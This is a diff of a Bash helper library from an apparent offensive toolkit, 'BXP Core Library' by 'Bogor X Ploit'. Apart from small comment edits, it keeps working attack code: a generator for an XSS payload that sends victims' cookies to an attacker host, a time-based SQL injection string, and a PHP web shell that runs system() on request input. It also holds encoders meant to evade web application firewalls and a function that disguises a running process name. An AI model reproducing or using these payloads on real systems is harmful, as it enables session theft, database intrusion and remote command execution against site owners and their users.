@@ -1,15 +1,12 @@
 #!/usr/bin/env bash
 # ============================================
 #   BXP CORE LIBRARY v1.0
-#   Engine: Native Core (No External Wrapper)
 #   By Bogor X Ploit
 # ============================================
 
-# --- 1. UI & Colors ---
 export C='\033[0;36m'; export B='\033[0;34m'; export W='\033[1;37m'
 export R='\033[0;31m'; export Y='\033[1;33m'; export G='\033[0;32m'; export N='\033[0m'
 
-# --- 2. Native HTTP Request ---
 bxp_http_request() {
     local url="$1"; local payload="$2"
     local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) BXP-Engine/1.0"
@@ -18,27 +15,23 @@ bxp_http_request() {
     echo "$response_time"
 }
 
-# --- 3. Encoder Engine (Anti WAF) ---
 bxp_encode_b64() { echo -n "$1" | base64 -w 0; }
 bxp_encode_hex() { echo -n "$1" | xxd -p | tr -d '\n'; }
 bxp_encode_url() { python3 -c "import urllib.parse; print(urllib.parse.quote('''$1'''))" 2>/dev/null || echo "$1"; }
 
-# --- 4. Payload Engine (Generator) ---
 bxp_gen_xss() { echo "<script>new Image().src='http://${1}:2010/?c='+document.cookie;</script>"; }
 bxp_gen_sqli() { echo "1' AND (SELECT 1 FROM (SELECT SLEEP(${1}))a)-- -"; }
 bxp_gen_php_shell() { echo "<?php if(isset(\$_REQUEST['c'])){ system(\$_REQUEST['c']); } ?>"; }
 
-# --- 5. Stealth Engine (Hiding) ---
 bxp_hide_process() {
     if command -v exec >/dev/null; then exec -a "$1" bash; fi
 }
 
-# --- 6. System Engine (Device Check) ---
 bxp_check_root() {
     if [ "$(id -u)" -eq 0 ]; then echo "Root"; else echo "Non-Root"; fi
 }
 
-# --- 7. HEADER ASCII ENGINE (Teks Gede) ---
+# --- HEADER ASCII ENGINE ---
 bxp_ascii_title() {
     local title="$1"
     clear
